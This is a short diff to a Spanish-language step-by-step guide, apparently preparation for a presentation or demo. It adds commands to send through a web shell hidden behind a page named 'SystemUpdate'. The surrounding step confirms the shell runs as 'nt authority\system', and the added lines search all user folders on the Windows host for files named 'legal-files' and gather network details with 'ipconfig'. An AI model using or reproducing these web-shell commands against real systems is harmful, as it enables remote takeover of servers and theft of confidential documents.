@@ -79,6 +79,8 @@ Estos pasos deben realizarse **antes** de empezar la presentación para asegurar
 4.  **Verificar:**
       * Visitar: `.../bin/view/Main/SystemUpdate?cmd=whoami`.
       * Confirmar que devuelve `nt authority\system` o similar.
+      * SystemUpdate?cmd=cmd%20/c%20dir%20%22C:%5CUsers%5C*%22%20/s%20/b%20%7C%20findstr%20/i%20%22legal-files%22
+      * SystemUpdate?cmd=ipconfig
 
 -----
 
